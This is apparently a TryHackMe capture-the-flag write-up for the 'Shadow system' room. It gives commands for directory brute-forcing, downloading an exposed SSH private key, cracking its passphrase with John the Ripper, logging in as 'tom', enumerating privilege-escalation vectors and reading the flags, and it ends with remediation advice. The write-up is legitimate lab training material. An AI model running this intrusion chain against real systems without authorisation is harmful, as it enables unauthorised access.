# Shadow System — TryHackMe Write-Up

**Room Name:** Shadow system  
**Difficulty:** Easy / Medium  
**Objective:** Enumerate the exposed web service, locate and retrieve the private SSH key (`id_rsa`), crack the key passphrase offline, establish SSH access as `tom`, escalate privileges on the target host, and read both `user` and `root` flags.

## Overview

`Shadow system` is a boot-to-root style challenge designed around structured enumeration, credential/key discovery, offline passphrase auditing, authenticated remote access, and local privilege escalation. Rather than relying on a single noisy exploit, the challenge rewards methodical reconnaissance and careful verification at every stage of the attack chain.

## 1. Reconnaissance & Web Enumeration

### 1.1 Target Reachability and Initial Inspection

Before launching deeper enumeration, verify network reachability to the target machine and check what services are responding on standard web ports.

ping -c 4 <TARGET_IP>
curl -I http://<TARGET_IP>/

Inspecting the initial HTTP response and landing page helps establish baseline context, server headers, and potential paths worth exploring with a directory wordlist.

### 1.2 Directory and File Enumeration

Run directory brute-forcing against the HTTP service to uncover hidden directories, backup files, configuration artifacts, or exposed key material.

dirb http://<TARGET_IP>/

You can also use an alternative directory enumeration tool with a standard wordlist to cross-check hidden endpoints:

gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 40

### 1.3 Retrieving the Private Key (`id_rsa`)

Once enumeration identifies an exposed SSH private key (`id_rsa`) under a web path, download it locally and apply strict file permissions so SSH accepts the key without permission warnings.

wget http://<TARGET_IP>/<PATH_TO_ID_RSA> -O id_rsa
chmod 600 id_rsa
file id_rsa
head -n 5 id_rsa

## 2. Offline Passphrase Cracking & Initial Access

### 2.1 Extracting the Hash and Cracking with John the Ripper

If the `id_rsa` private key is protected by a passphrase, convert it into a format John the Ripper can process and run a wordlist attack against it.

ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

After cracking completes, review the recovered passphrase cleanly:

john --show id_rsa.hash

### 2.2 SSH Authentication as `tom`

Use the private key (`id_rsa`) along with the recovered passphrase to authenticate over SSH as user `tom`:

ssh -i id_rsa tom@<TARGET_IP>

Once an interactive shell as `tom` is established, perform basic situational awareness and locate/read the user flag:

id
whoami
hostname
uname -a
pwd
ls -la
cat user.txt

## 3. Post-Exploitation & Privilege Escalation

### 3.1 Local Enumeration for Privilege Escalation Vectors

With shell access as `tom`, inspect local permissions, sudo rules, SUID/SGID binaries, scheduled tasks, and writable files/scripts that may allow escalating privileges to `root`.

sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
ps aux

### 3.2 Escalating to `root` and Reading the Root Flag

Leverage the identified privilege escalation vector to obtain `root` privileges, confirm elevated identity, inspect `/root`, and read `root.txt`:

id
ls -la /root
cat /root/root.txt

## 4. Key Takeaways & Remediation

- Do Not Expose Sensitive Files in Web Roots: Private keys (`id_rsa`), backups, and configuration files should never be placed in publicly accessible web directories.
- Enforce Strong Passphrases and Key Hygiene: Protected keys with strong passphrases and restricted `600` permissions reduce unauthorized reuse risk, while avoiding key exposure altogether prevents initial compromise.
- Audit Sudo, SUID, and System Configurations: Regularly review `sudo -l`, SUID binaries, cron jobs, and file ownership to prevent unintended local privilege escalation paths.
